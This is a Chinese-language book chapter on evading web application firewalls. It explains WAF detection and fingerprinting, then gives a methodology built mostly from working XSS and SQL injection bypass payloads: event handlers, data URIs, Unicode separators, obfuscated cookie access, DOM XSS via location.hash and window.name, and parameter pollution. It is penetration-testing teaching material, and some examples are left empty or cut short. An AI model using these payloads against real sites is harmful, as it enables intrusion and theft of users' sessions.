# 第 13 章 规避 Web 应用防火墙（WAF）

## 13.1 WAF 简介

Web 应用防火墙（WAF）被认为是防御应用程序攻击的主要防线。它们通常被称为下一代 WAF，其定义随着时间的推移而演变，最新的趋势是利用机器学习（ML）和人工智能（AI）的 WAF。然而，尽管有这些进步，WAF 在防御基于应用程序的安全攻击方面的有效性仍然有限。这主要是因为 WAF 不具备上下文感知能力，而且大多数仍然严重依赖模式匹配。

在本章中，我们将讨论各种绕过 WAF 的前沿方法。虽然本书涵盖了针对 SQL 注入等技术的绕过方法，但本章的大部分内容将主要关注 XSS。尽管有几种防御机制，XSS 仍然普遍存在，部分原因是 JavaScript 的多功能性。我们还将研究微软 Internet Explorer（IE）为获得竞争优势而引入的功能如何经常被利用，导致在最终将该浏览器退役以支持 Microsoft Edge 之前，需要付出相当大的努力来加强其 XSS 过滤器。

需要注意的是，本章中涵盖的所有有效载荷都是最新的，并且可以在现代浏览器上运行。然而，随着浏览器不断更新以对抗 XSS 方法，一些有效载荷在阅读或出版本书时可能已经过时。本章中术语“WAF”和“过滤器”可互换使用，指的是相同的概念。

### 13.1.1 WAF 检测方法

在探索绕过技术之前，了解 WAF 用于检测恶意流量的方法至关重要。现代 WAF 在高层通常依赖以下技术之一。

### 13.1.2 正则表达式

正则表达式是 WAF 用于检测恶意流量的常用机制。它们可用于匹配输入的模式。WAF 规则集和签名的大部分核心都依赖于正则表达式，这些正则表达式是旨在匹配恶意输入中模式的字符序列。虽然有效，但过度依赖正则表达式可能导致问题。一个值得注意的问题是正则表达式拒绝服务（ReDoS），其中过于复杂的表达式可能被利用导致拒绝服务。

### 13.1.3 贝叶斯分析

与返回“真”或“假”决策的正则表达式不同，贝叶斯分析采用概率方法来评估有效载荷为恶意的可能性。在这种方法中，每个有效载荷根据各种特征被分配一个分数。如果此分数超过预定义的阈值，则该有效载荷被标记为潜在有害。管理员可以灵活地调整这些阈值，以减少误报。

### 13.1.4 机器学习

用于检测恶意输入的一种相对较新的方法是利用 ML。在此模型中，WAF 使用良性有效载荷和恶意有效载荷进行训练。随着时间的推移，其系统变得更擅长预测和识别攻击，随着接收更多数据输入，其有效性不断提高。ML 允许一种更动态和自适应的方法，随着新兴威胁而发展，并减少对静态规则集的依赖。需要注意的是，此类 WAF 的有效性将取决于其训练所用的数据集的质量。

### 13.1.5 了解 WAF 安全模型：白名单和黑名单

WAF 主要在两种不同的模型下运行，即白名单和黑名单。让我们简要讨论一下。

### 13.1.6 基于白名单的模型

白名单模型，也称为“接受已知良好”方法，允许定义允许的预定义输入。任何不在该预定义列表上的输入均被禁止。白名单模式在现实中并不实用。这主要是因为大多数 Web 应用程序是动态的，使得白名单在预测和列出所有合法输入方面极具挑战性。因此，由于这些实际困难，大多数 WAF 被配置为使用黑名单方法。

### 13.1.7 基于黑名单的模型

相反，黑名单遵循“拒绝已知不良”的原则。它涉及定义不允许的输入列表，同时允许其他所有内容。这种方法的一个主要问题是混淆的可能性几乎是无限的，特别是在 XSS 的上下文中，由于 JavaScript 的动态特性。此外，考虑到不同浏览器的不同怪癖和功能，维护有效的黑名单成为一项极具挑战性的任务。因此，严格的黑名单可能能够阻止攻击者，但会限制系统的功能和潜在可用性，并可能导致误报。

例如，以流行的 WAF ModSecurity 为例。它在检测到输入中的“src”和“base64”等关键字时，会将输入归类为恶意。在频繁使用此类术语的环境中（如基于聊天的应用程序或社交媒体平台），这可能特别成问题。

### 13.1.8 指纹识别 WAF

测试 WAF 之前的第一步是执行枚举。这将包括收集有关 WAF 的详细信息，如类型、操作模式和版本。了解您所面对的确切防火墙类型可以在实际测试中节省大量时间。您可以研究现有的绕过方法并加以利用，而不是从头开始构建新的绕过方法。这种方法符合《孙子兵法》中的战略原则：“知己知彼，百战不殆”。

无论设计如何，WAF 都会留下各种可以揭示其存在的痕迹和足迹。常见的迹象包括 Cookie 中的独特模式、HTTP 响应、内容和标头的重写，甚至 DNS 记录。WAF 某些指标的存在可能是有意的。一些 WAF 供应商可能不认为对其系统进行指纹识别或枚举是重大威胁，因此不会隐藏这些指标。相反，其他供应商可能故意显示其存在以协助调试过程，尤其是在误报的情况下。此外，这些指标可能作为一种威慑形式或用于品牌推广目的。

以下是通过真实示例对 WAF 进行指纹识别的常用方法列表。

### 13.1.9 Cookie 值

某些 WAF 使用唯一的 Cookie 名称，这可能作为防火墙存在的线索。WAF 使用 Cookie 的原因有多种，包括会话管理、机器人检测、速率限制等。

Barracuda 是另一个通过添加自定义 Cookie 来表明身份的 WAF 示例。对受 Barracuda 保护的站点发起一个简单的、非恶意的 GET 请求，将导致添加名为“barra_counter_session”和“BNI_Barracuda_LB_Cookie”的 Cookie。

### 13.1.13 HTTP 响应码

虽然有些 WAF 通过 Cookie 值表明身份，但其他 WAF 通过返回 HTTP 响应码（如 403、406、419、500、501、999 等）来响应恶意请求，从而表明其身份。

### 13.1.14 ModSecurity

ModSecurity 是 Apache 服务器上使用最广泛的开源 WAF 之一。当它识别到恶意请求时，ModSecurity 会返回“406 Not Acceptable”错误。此外，响应正文包含错误由 ModSecurity 生成的指示，从而揭示其存在。

**请求**
```

User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:25.0) Gecko/20100101 Firefox/25.0

Accept-Encoding: gzip, deflate
Connection: keep-alive
```

**响应**

### 13.1.17 连接关闭

检测 WAF 的另一种方法是检查它是否静默丢弃任何恶意请求。一个迹象可以是响应中的“close”连接选项，这意味着在完成响应后将终止或关闭连接。这种方法在旨在应对暴力破解和拒绝服务攻击的 ModSecurity 实现中得到了体现。在这种情况下，ModSecurity 可能使用“close”连接选项作为防御措施，以保护服务器免受这些类型的威胁。

**ModSecurity 规则**
```
SecAction phase:1,id:109,initcol:ip=%{REMOTE_ADDR},nolog
SecRule ARGS:login "!^$" "nolog,phase:1,id:110,setvar:ip.auth_attempt=+1,deprecatevar:ip.auth_attempt=25/120"
SecRule IP:AUTH_ATTEMPT "@gt 25" "log,drop,phase:1,id:111,msg:'Possible Brute Force Attack'"
```

该规则记录 IP 地址以监控基本身份验证尝试。在检测到 120 秒时间窗口内出现 25 次无效登录尝试后，该规则触发发送“FIN”数据包。该数据包有效终止 TCP/IP 三次握手，这是建立网络连接的关键步骤，从而在指定的时间范围内阻止来自该 IP 地址的进一步尝试。

## 13.2 绕过 WAF——以 XSS 为例的方法论

最早的 XSS 速查表之一是安全研究员 Robert “RSnake” Hansen 的“XSS Evasion Cheat Sheet”。然而，由于缺乏维护，该速查表最终过时了。目前，最全面和最新的资源是“Portswigger’s XSS Cheat Sheet”。与该速查表不同的是，与其他许多速查表相比，它缺乏系统的方法论，这可能会使渗透测试人员和研究人员在特定有效载荷的适当上下文和使用顺序方面感到困惑。

在本节中，我们旨在提供一种系统的方法来处理 WAF。WAF 通常依赖基于正则表达式的黑名单。在此上下文中最有效的策略是正则表达式反转。这涉及识别 WAF 列入黑名单的输入，并尝试绕过它们。我们在此定义的有效载荷针对现代浏览器（特指 Chrome 和 Firefox）进行了优化。

### 13.2.1 注入无害 HTML

确定 WAF 是否允许注入常见 HTML 标签，如 `<b>`、`<i>` 和 `<u>`。这些标签通常在使用了所见即所得编辑器和评论表单的应用程序中被允许。目标是测试 WAF 是否过滤掉了“<”和“>”括号。

### 13.2.2 注意事项

1. 检查“<”和“>”标签是否被 HTML 编码，或者它们是否从输入中被剥离。
2. 确定过滤器是移除“<”和“>”括号，还是只移除其中一个。

仔细记录过滤器对注入的响应，注意任何变化，因为这可能表明存在不同的过滤规则或机制，这一点至关重要。

### 13.2.3 注入 Script 标签

`<script>` 标签是注入 JavaScript 的最常见方法之一；因此，它成为最先被设置的规则之一也就不足为奇了。因此，对于配置良好的过滤器，找到针对此向量的绕过方法具有挑战性，但对于测试过滤器的强度却至关重要。然而，应该选择阻力最小的路径，即在转向更复杂的有效载荷之前，先测试简单的有效载荷。

在测试 `<script>` 标签时，如果基本的注入被阻止，可以使用以下精心构造的有效载荷来评估过滤器的有效性：

| 有效载荷 | 目的 | 兼容性 |
|----------|------|----------|
| `<sCRiPt>alert(1);</sCRipT>` | 确定过滤器是否无法识别有效载荷中的大小写组合。 | Chrome, Firefox |
| `<script/tmgmtmgm>alert(1);</script>` | 测试过滤器是否查找 `<script>` 标签并允许随机字符。 | Chrome, Firefox |
| `<ScRiPt>alert(1);` | 不使用闭合标签进行注入 | 不会自动执行 |
| `<SCriPt>delete alert;alert(1)</sCriPt> //` | 使用 delete 关键字混淆过滤器 | 不会自动执行 |
| `<script>confirm(1);</script>` | 测试在开头的 script 标签后注入换行符的效果。 | Chrome, Firefox |

### 13.2.4 使用属性和相应标签进行测试

如果 `<script>` 标签被阻止，与其尝试 HTML 标签，不如采用一种有效的替代策略来确定过滤器是否在阻止特定属性。请记住，目标是通过产生最少的噪音来绕过过滤器，这意味着提交最少量的有效载荷。

如果这些属性通过了过滤器，则可以深入了解可以使用哪些相应的 HTML 标签来测试过滤器的有效性。要测试的关键属性包括但不限于：src、srcdoc、data、form、formaction、code 和 href。

### 13.2.5 使用 src 属性进行测试

有许多 HTML 标签利用 src 属性配合事件处理程序来执行 JavaScript。以下是一些示例：

| 标签 | 有效载荷 | 兼容性 |
|------|----------|----------|
| img | `<img src=x onerror=prompt(1);>` | Chrome, Firefox |
| img | `<img/src=aaa.jpg onerror=prompt(1);>` | Chrome, Firefox |
| video | `<video src=x onerror=prompt(1);>` | Chrome, Firefox |
| audio | `<audio src=x onerror=prompt(1);>` | Chrome, Firefox |
| video | `<video><source onerror=alert(1)>` | Chrome, Firefox |
| iframe | `<iframe src=javascript:alert(1)>` | Chrome, Firefox |
| embed | `<embed src="javascript:alert(1)">` | Firefox |

### 13.2.6 使用 Srcdoc 属性进行测试

srcdoc 属性是 HTML5 中 `<iframe>` 元素特有的。它用于定义 iframe 的 HTML 内容，允许直接在元素内设置内联 HTML，而无需通过 src 属性加载外部资源。

| 有效载荷 | 兼容性 |
|----------|----------|
| `<iframe srcdoc="<script>alert('XSS')</script>"></iframe>` | Chrome, Firefox |
| `<iframe srcdoc="<iframe src='javascript:alert(&quot;XSS&quot;)'></iframe>"></iframe>` | Chrome, Firefox |
| `<iframe srcdoc="&lt;script&gt;alert(1);&lt;/script&gt"></iframe>` | Chrome, Firefox |

### 13.2.7 使用 Action 属性进行测试

下一步是使用“action”属性进行测试，该属性与 form 标签一起使用。

| 标签 | 有效载荷 | 兼容性 |
|------|----------|----------|

| 带 button 标签的表单 | `<button form=x xss<form id=x action="javascript:alert(1)"//` | Chrome, Firefox |
| 带 button 和 form 标签 | `<form><button formaction="javascript:alert(1)">Click me</button></form>` | Chrome, Firefox |

## 13.3 使用 Formaction 属性进行测试

formaction 属性在 `<button>` 或 `<input type="submit/image">` 元素上指定，以覆盖关联表单的 action 属性。如果过滤器阻止了 action 属性，你可以利用“formaction”属性来执行 JavaScript：

### 13.3.2 使用 href 属性进行测试

**注入基本锚点标签：**

**使用 JavaScript 伪协议进行测试：**

### 13.3.3 使用伪协议进行测试

JavaScript 协议通常用于执行 JavaScript 代码，但这不是唯一的方法。另一种强大的机制是“Data URI”方案，它可以将多种类型的数据直接嵌入到 Web 文档中。

Data URI 的基本结构如下：

**示例**
```
data:[<mediatype>][;base64],<data>
```

媒体类型尤其值得我们关注，通过将其设置为“text/html”，我们可以直接在 URI 中包含 HTML 内容。以下是如何构造 Data URI 以执行 JavaScript 的通用示例：

**示例**
```
data:text/html;base64,Base64EncodedData
```

要使用此方法构造 XSS 有效载荷，我们首先获取 JavaScript 代码，例如：

**示例**
```html
<script>alert(1);</script>
```

通过将 Adobe XSS 向量编码为 base64 格式，我们得到以下内容：

**有效载荷**
```
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTs8L3NjcmlwdD4=
```

**图 13.5 在 null 源上执行的 Data URI**

**有效载荷**

**图 13.6 在 xss-labs.com 上执行的 Data URI**

### 13.3.9 使用 Unicode 分隔符绕过

在 Unicode 字符集中，有几个字符被解释为空白字符，称为“Unicode Separators”。这些字符的识别可能因浏览器而异。根据上下文和有效载荷，你可以将这些分隔符插入 XSS 有效载荷中。常用的 Unicode 分隔符包括：

**Unicode 分隔符**
- 0x09（水平制表符）
- 0x0A（换行符）
- 0x0B（垂直制表符）
- 0x0C（换页符）
- 0x0D（回车符）
- 0x20（空格）

考虑以下正则表达式，它过滤掉出现在关键字“on”之后、后跟空格和等号的序列：

**示例**
```
(?i)([\s"';/0-9=]+on\w+\s*=)
```

**图 13.7 正则表达式**

此正则表达式使用 `\s` 元字符匹配空白字符，但可能不包含所有有效的 Unicode 空白字符。因此，像以下这样的有效载荷可能被阻止：

**示例**
```html
<a onmouseover=location='javascript:alert(1)'>click
```

然而，正则表达式的问题是 `\s` 元字符没有涵盖所有有效空白字符的列表。因此，我们可以注入一个有效的分隔符，如 `U+000C` 来构建绕过。

**示例**
```html
<a onmouseover%0C=location='javascript:alert(1)'>click
```

过去，ModSecurity 使用类似的正则表达式来防止注入事件处理程序。一种利用 `U+000C` 分隔符的绕过方法被开发出来。

**示例：ModSecurity 绕过**
```html
<a onmouseover%0C=location=%27\x6A\x61\x76\x61\x53\x43\x52\x49\x50\x54\x26\x63\x6F\x6C\x6F\x6E\x3B\x63\x6F\x6E\x66\x69\x72\x6D\x26\x6C\x70\x61\x72\x3B\x64\x6F\x63\x75\x6D\x65\x6E\x74\x2E\x63\x6F\x6F\x6B\x69\x65\x26\x72\x70\x61\x72\x3B%27>CLICK
```

根据上下文，以下有效载荷可以在现代浏览器上工作：

**示例**
```html
<svg%0Conload%0C=alert(1)>
<svg%09onload=alert(1)>
<svg%20onload%09%20%0C%0D=alert(1)>
```

然而，根据上下文，你可能可以注入其他分隔符，如垂直制表符“0x0B”。

**示例**
```html
<a%20href="%0C%0Bjavascript:alert(1)">Clickhere
<a%20href="%0C%0Bjavascript:alert(1)%09%20%0C%0B">Clickhere
```

### 13.3.12 绕过基于关键字的过滤器

许多基于签名的过滤器使用关键字过滤来阻止 JavaScript 关键字，如“alert”、“confirm”、“prompt”、“eval”、“javascript”、“data”、“throw”等，以阻止 JavaScript 执行。然而，由于这些关键字可以以多种方式表示或混淆，这种方法不仅无法完全防止 XSS，而且往往会产生大量误报，因为这些关键字也可能用于合法上下文。

### 13.3.16 使用非字母数字 JS 绕过基于关键字的过滤器

JavaScript 由于其灵活性，允许使用非字母数字字符表示某些属性。这种技术的唯一缺点是在现实世界中编码整个有效载荷是不可行且不实用的。为了说明，非字母数字 JS 中的“alert”关键字相当于 393 个字符。因此，实用的方法是编码 JavaScript 有效载荷的一部分，并将其与其他关键字片段拼接。

| `alert(this["document"]["cookie"])` | `alert(this["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["cook" + ([![]]+[] [[]]) [+!+[] + [+[]]] + (!![]+[])[!+[]+!+[]+!+[]]])` | 括号表示法 + 字符串拼接 + 非字母数字 JS + 十六进制转义的组合。 |

像 Jsfuck.com 和 Hieroglyphy [https://github.com/alcuadrado/hieroglyphy] 这样的工具可用于将字符串转换为非字母数字 JS。

### 13.3.17 替代执行汇点

如果你仔细观察，上述所有字符串拼接选项都需要执行汇点，如“eval”。由于“eval”可用于将字符串作为 JavaScript 代码执行，以下是一个示例：

**示例**
```html
<script>eval(/ale/.source + /rt/.source + "(1)");</script>
```

也可以结合这些拼接技术；以下示例演示了基本拼接和正则表达式源属性的组合：

**示例**
```html
<script>eval("a" + "l" + "e" + /rt/.source + "(1)");</script>
```

可能会遇到“eval”函数被过滤的情况。在这种情况下，可以使用几种替代执行汇点，如 setTimeout()、setInterval() 等。以下是一些示例：

**示例 1：**
```html
<script>setTimeout("a" + "lert" + "(1)");</script>
```

**示例 2：**
```html
<img src=a onerror=setInterval(String['fromCharCode'](97,108,101,114,116,40,39,120,115,115,39,41,32))>
```

**示例 3：**
```html
<script>new Function('${'a'}${'l'}${'e'}${'r'}${'t'}(1)')();</script>
```

然而，函数汇点的一个非常有趣的变体如下：

**示例：**
```html
[].constructor.constructor("alert" + "(1)")()
```

在此示例中，`[].constructor` 是一个数组函数，实际上等同于一个函数；当与第二个构造函数结合时，它变成 Array.constructor。它成为一个函数，并生成以下输出：

**示例**
```
function() {alert(1)}
```

括号对于执行该函数是必需的：

**示例**
```
function() {alert(1)}()
```

在撰写本文时，最新发现是 navigation.navigate 函数，由 Chrome 引入并由 Gareth Heyes 发现。该函数允许客户端重定向，可用于执行 JavaScript 代码：

**示例**
```html
<script>navigation.navigate('javascript:alert(1)')</script>
```

### 13.3.18 绕过 WAF 的解码实体

了解 WAF 的行为对于构建绕过至关重要。在某些情况下，WAF 可能出于各种原因解码实体。在某些情况下，WAF 可能会将解码实体作为其过滤过程的一部分。因此，如果已知过滤器会阻止或剥离“<”和“>”等字符，确定它是否也解码实体会很有帮助。

- **URL 编码：** `%3Cb%3E` —— 这是 `<b>` 标签的 URL 编码形式。
- **HTML 实体：** `&lt;b&gt;` —— 这是 `<b>` 标签的 HTML 编码表示。
- **Unicode 实体：** `\u003cb\u003e` —— 此 Unicode 序列在解码时表示 `<b>` 标签的字符。
- **十六进制实体：** `\x3cb\x3e` —— 这是 `<b>` 标签的十六进制等效值。

观察过滤器对这些编码的响应可以揭示它是否将实体解码回其原始形式。

### 13.3.19 案例研究：Laravel XSS 过滤器绕过

这种方法的一个显著示例是我几年前发现的 Laravel 4.1 XSS 过滤器绕过。该过滤器会将 HTML 实体解码回其原始形式。以下是用于测试 WAF 对实体解码行为的输入：

**有效载荷**
```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">Clickhere</a>
```

提交后，过滤器解码实体，得到以下有效载荷：

**解码后的有效载荷**
```html
<a href="javascript:alert(1)">Clickhere</a>
```

输出因存在关键字“JavaScript”和“alert”而触发警报，导致请求被阻止。为了绕过这一点，初始有效载荷被双重编码为 HTML 实体，这本身在 href 上下文中不会形成有效的 JavaScript 执行有效载荷：

**POC**
```html
<a href="&#38;&#35;&#49;&#48;&#54;&#38;&#35;&#57;&#55;&#38;&#35;&#49;&#49;&#56;&#38;&#35;&#57;&#55;&#38;&#35;&#49;&#49;&#49;&#53;&#38;&#35;&#57;&#57;&#38;&#35;&#49;&#49;&#52;&#38;&#35;&#49;&#48;&#53;&#38;&#35;&#52;&#49;&#49;&#50;&#38;&#35;&#49;&#49;&#54;&#38;&#35;&#53;&#56;&#38;&#35;&#57;&#57;&#38;&#35;&#49;&#49;&#49;&#38;&#35;&#49;&#49;&#48;&#38;&#35;&#49;&#48;&#50;&#38;&#35;&#49;&#48;&#53;&#38;&#35;&#52;&#57;&#49;&#52;&#38;&#35;&#49;&#48;&#57;&#38;&#35;&#52;&#48;&#38;&#35;&#52;&#57;&#38;&#35;&#52;&#49;">Click here</a>
```

过滤器解码实体一次，没有发现可疑关键字，因此允许以下有效载荷通过。

**解码后的有效载荷**

```html
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#99;&#111;&#110;&#102;&#105;&#114;&#109;&#40;&#49;&#41;">Clickhere</a>
```

此有效载荷在“href”上下文中构成有效语法，并成功执行 JavaScript。类似的技术可以应用于为其他攻击类别（如 SQL 注入）构建绕过。

### 13.3.20 通过标签嵌套绕过递归过滤器

在处理过滤或剥离“<script>”等输入的 WAF 时，一种有效的规避技术是将这些标签相互嵌套。这种方法有时可以混淆过滤器，使其忽略嵌套结构，而浏览器可能仍将其处理为有效标签。考虑过滤器通过删除该字符串的出现来定位“<script>”标签的情况：

**示例**
```html
<scr<script>ipt>alert(1)</scr<script>ipt>
```

在此示例中，过滤器可能会剥离内部的 `<script>` 和 `</script>` 字符串，但会保留外部部分。这可能导致在浏览器处理 HTML 时 `<script>` 标签被拼接在一起。

对于其他攻击类别，如 SQL 注入攻击，也适用类似的原理。攻击者可能使用标签嵌套来混淆过滤器，使其允许部分关键字通过，然后完成 SQL 命令。以下是一些示例：

**示例**
```
UNIUNIONON SELSELECTECT username, password FROM users
```

在此示例中，插入部分关键字可能导致过滤器只移除识别出的部分（UNION, SELECT），留下有效的 SQL 命令。

### 13.3.22 绕过不当的输入转义

许多上下文感知过滤器通常尝试通过使用反斜杠转义单引号或双引号来阻止 JavaScript 执行，从而防止用户跳出上下文执行 JavaScript。然而，这些过滤器可能无法转义反斜杠字符本身，这可能成为绕过的机会。考虑用户输入在 script 标签内反射的示例：

**示例**

```html
    var input = "teststring";
</script>
```

**示例**

```html
<script>
    var input = "\";alert(1)//";
```

**示例**

```html
<script>
```

### 13.3.23 使用 DOM XSS 绕过

WAF 在服务器端运行，无法感知客户端请求。此特性意味着，如果传统的 XSS 可以转换为基于 DOM 的 XSS，则有可能绕过一些过滤器。此外，浏览器已弃用客户端 XSS 过滤器，这使得规避过程更加容易。实现此目的的方法是通过使用 location.hash 属性，该属性表示 URL 中“#”之后的任何内容。让我们检查以下有效载荷：

**示例 1：**
```html
www.example.com/xss=<svg/onload=eval(location.hash.slice(1))>?#alert(1)
```

此有效载荷使用 location.hash.slice(1) 函数，该函数将返回第一个位置的字符，因为哈希（#）的位置为 0，然后由 eval 函数评估，最终执行哈希之后传递的有效载荷。在此实例中，它将执行 alert(1)。

如前所述，如果“eval”关键字被阻止，可以利用 setTimeout、setInterval 等替代执行方法以及之前讨论的其他技术。这些替代汇点提供了一种在传统方法受限时执行脚本的方法。

浏览器会编码通过 location.hash 传递的某些字符，在这种情况下，可以使用 unescape 和 atob 等函数。例如，以下有效载荷使用“atob”属性解码 location.hash 之后传递的 base64 字符串。

**示例 2：**
```html
www.example.com/xss=<svg/onload=eval(atob(location.hash.slice(1)))>#YWxlcnQoMSkvLw==
```

“document.body.innerHTML”属性提供了另一种 DOM 操作方法。通过将此属性设置为 location.hash，URL 中哈希（#）之后的任何内容都会被写入 DOM。为了解码内容，使用 decodeURIComponent。

**示例 3**
```html
www.example.com/xss=<svg/onload=document.body.innerHTML=decodeURIComponent(location.hash.slice(1))>//#<img%20src=x%20onerror=prompt(1)>
```

类似地，我们可以利用 location.hash[index] 属性注入不允许的字符。例如，考虑 WAF 过滤冒号“:”、左/右括号“()”等字符的场景：

**基本有效载荷**
```html
<svg/onload=location="javascript:alert(document.domain)">
```

WAF 会因存在不允许的字符而阻止此有效载荷。然而，我们可以通过在 URL 哈希的特定位置定义这些字符来绕过此限制。

- location.hash[1] = “:”  // 设置为哈希之后的第一个字符。
- location.hash[2] = “(” // 设置为第二个字符。
- location.hash[3] = “)” // 设置在第三个位置。

**示例 4：**
```html
www.example.com/xss=<svg onload="location='javascript)'+location.hash[1]+'alert'+location.hash[2]+'1'+location.hash[3]">#:()
```

然后在 URL 中，在哈希之后附加 #:()。

### 13.3.24 针对不允许的关键字的示例

如果像“javascript”和“alert”这样的关键字被禁止，可以使用正则表达式源进行字符串拼接作为替代。

**示例 5**
```html
www.example.com/xss=<svg/onload=location=/java/.source+/script/.source+location.hash[1]+/al/.source+/ert/.source+location.hash[2]+/docu/.source+/ment.domain/.source+location.hash[3]#:()
```

### 13.3.25 使用 Window.Name 属性

虽然涉及 location.hash 属性的向量在许多上下文中都很有用，但一个明显的缺点是在不同浏览器中的功能不一致。此外，一些过滤器和输入字段可能限制长度，只允许一定数量的字符。此限制可能阻碍许多 XSS 向量，尤其是在使用 location.hash 和编码函数时，因为它可能消耗过多的输入长度。在这种情况下，window.name 属性可以作为一个替代方案。

Window.name 属性用于为窗口或标签页分配一个“名称”。它是同源策略（SOP）的一个例外。与大多数属性不同，window.name 在不同源的页面之间导航时会保留其值。这可以通过将 window.name 属性设置为我们的 XSS 有效载荷，并在易受攻击页面的上下文中执行来利用。

为了说明，考虑以下利用 window.name 属性执行 JavaScript 的基本向量：

**示例**
```html
<svg onload=eval(window.name)//
<svg/onload=location=name//
<body/onload=location=name//
<body/onload=location=write(top)//
```

## 13.4 设置 Name 属性

为了在易受攻击站点（example.com）的上下文中执行这些向量，我们必须跨源设置 window.name 属性。有几种方法可以实现这一点。

## 13.5 示例 1：使用 IFRAME 标签

以下向量通过 iframe 设置“name”属性：

```html
<iframe name="javascript:alert(1)" src="https://example.com/?xss=%22%3E%3Csvg/onload=location=name//">
```

这种方法的一个限制是网站可能将 X-Frame-Options 配置为“SAMEORIGIN”或“DENY”，阻止 iframe 从不同源加载内容。为了克服这一点，可以使用 window.open 函数。

## 13.6 示例 2：WINDOW.OPEN 函数

以下向量通过 window.open 函数设置“name”属性。此函数的第二个参数指定 window.name 属性的值，该值设置为我们的 XSS 有效载荷。

**有效载荷**
```html
<script>
    window.open('http://example.com/?xss=<svg/onload=location=name//','javascript:alert(1)');
</script>
```

此向量的明显缺点是现代浏览器通常会请求用户许可才能打开弹出窗口，作为对侵入式弹出广告的响应。为了克服这一点，可以使用锚点标签。

## 13.7 示例 3：ANCHOR TAG

以下向量通过锚点标签设置“name”属性：

**有效载荷**
```html
<a href="//target.com/?xss=<svg/onload=location=name//" target="javascript:alert(1)">CLICK</a>
```

### 13.7.3 使用 HPP 绕过 WAF

HTTP 参数污染（HPP）攻击涉及通过构造多个相同参数实例来操纵应用程序的逻辑。根据服务器端语言和框架，具有不同输入的相同参数将以不同方式处理，根据上下文，这可能导致权限提升、信息泄露等。

然而，涉及 WAF 绕过的一个常见用例是，当相同参数被提交两次时，应用程序或服务器会拼接输入。

## 13.8 以 XSS 为例

考虑一个场景，应用程序易受 XSS 攻击，并且被 WAF 过滤。

**有效载荷**
```
http://example.com/page?param=<script>alert(1)</script>
```

在参数中查找字符串“script”的 WAF 会轻松阻止此请求。然而，通过 HPP，我们可以将 script 关键字拆分到多个参数中。WAF 会单独检查每个参数，并且找不到被禁止的字符串“script”。

**HPP POC**
```
http://example.com/page?param=<scr&param=ipt>alert(1)</scr&param=ipt>
```

## 13.9 以 SQL 注入为例

类似地，对于 SQL 注入，使用“UNION SELECT”的标准有效载荷如下所示：

```
http://example.com/page?param=1 UNION SELECT 1,2,3--
```

与 XSS 示例类似，我们可以将有效载荷语法拆分到多个参数中，以避免检测：

**HPP POC**
```
http://example.com/page?param=1 UNION SELE&param=CT 1,2,3--
```
